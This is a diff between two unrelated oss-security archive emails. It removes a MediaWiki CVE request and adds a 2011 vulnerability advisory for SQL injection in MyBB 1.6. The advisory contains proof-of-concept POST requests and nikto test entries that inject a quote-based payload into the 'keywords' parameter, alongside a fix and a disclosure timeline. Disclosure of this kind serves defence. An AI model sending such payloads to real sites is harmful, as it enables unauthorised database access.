@@ -1,30 +1,107 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/02/01/4
-Message-ID: <20110201153625.7fdd2ca9@angelo.pretender.us>
-Date: Tue, 1 Feb 2011 15:36:25 -0800
-From: Reed Loden <reed@...dloden.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/18/6
+Message-ID: <AANLkTimZGjkKy2G8pbJGKsq-QCKbxX-EwnJ35AGyMdy8@mail.gmail.com>
+Date: Fri, 18 Mar 2011 14:17:16 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
 To: oss-security@...ts.openwall.com
-Subject: CVE request: Server-side arbitrary script inclusion vulnerability in MediaWiki <=1.16.1
+Subject: CVE Request: MyBB 1.6 <= SQL Injection
 Content-Type: text/plain; charset=utf-8
 
-Greetings,
+1. OVERVIEW
 
-MediaWiki 1.16.2 was just released as a security update for two
-vulnerabilities. One already has a CVE, but this one still needs one:
+Potential SQL Injection vulnerability was detected in MyBB.
 
-"An arbitrary script inclusion vulnerability was discovered. The
-vulnerability only allows execution of files with names ending in
-".php" which are already present in the local filesystem. Only servers
-running Microsoft Windows and possibly Novell Netware are affected.
-Despite these mitigating factors, all users are advised to upgrade,
-since there is a risk of complete server compromise. MediaWiki 1.8.0
-and later is affected. For more details, see bug 27094"
 
-https://bugzilla.wikimedia.org/show_bug.cgi?id=27094
+2. APPLICATION DESCRIPTION
 
-Thanks,
-~reed
+MyBB is a free bulletin board system software package developed by the
+MyBB Group.
+It's supposed to be developed from XMB and DevBB bulletin board applications.
 
--- 
-Reed Loden
-reed@...dloden.com
+
+3. VULNERABILITY DESCRIPTION
+
+The "keywords" parameter was not properly sanitized in /private.php
+and /search.php which leads to SQL Injection vulnerability. Full
+exploitation  possibility is probably mitigated by clean_keywords and
+clean_keywords_ft functions in inc/functions_search.php.
+
+
+4. VERSIONS AFFECTED
+
+MyBB 1.6 and lower
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+=> /search.php
+
+POST /mybb/search.php
+
+action=do_search&forums=2&keywords='+or+'a'+'a&postthread=1
+
+
+=> /private.php
+
+POST /mybb/private.php
+
+my_post_key=&keywords='+or+'a'+'a&quick_search=Search+PMs&allbox=Check+All&fromfid=0&fid=4&jumpto=4&action=do_stuff
+
+
+Get nikto check
+http://trac2.assembla.com/Nikto_2/browser/trunk/plugins/db_tests?rev=588
+
+Or try nikto udb_tests
+
+"400000","0","9","/search.php","POST","MyBB has experienced an
+internal SQL error and cannot continue.","","","Sorry, but no results
+were returned","","MyBB 1.6 <= SQL Injection,  ref:
+http://yehg.net/lab/pr0js/advisories/[mybb1.6]_sql_injection","action=do_search&forums=2&keywords='+or+'a'+'a&postthread=1",""
+
+"400001","0","9","/private.php","POST","MyBB has experienced an
+internal SQL error and cannot continue.","","","Sorry, but no results
+were returned","","MyBBx 1.6 <= SQL Injection,  ref:
+http://yehg.net/lab/pr0js/advisories/[mybb1.6]_sql_injection","my_post_key=&keywords='+or+'a'+'a&quick_search=Search+PMs&allbox=Check+All&fromfid=0&fid=4&jumpto=4&action=do_stuff",""
+
+
+6. SOLUTION
+
+Upgrade to 1.6.1
+
+
+7. VENDOR
+
+MyBB Development Team
+http://www.mybb.com/
+
+
+8. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2010-12-09: notified vendor
+2010-12-15: vendor released fixed version
+2010-12-24: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/[mybb1.6]_sql_injection
+About MyBB: http://www.mybb.com/about/mybb
+
+
+#yehg [2010-12-24]
+
+
+---------------------------------
+Best regards,
+YGN Ethical Hacker Group
+Yangon, Myanmar
+http://yehg.net
+Our Lab | http://yehg.net/lab
+Our Directory | http://yehg.net/hwd
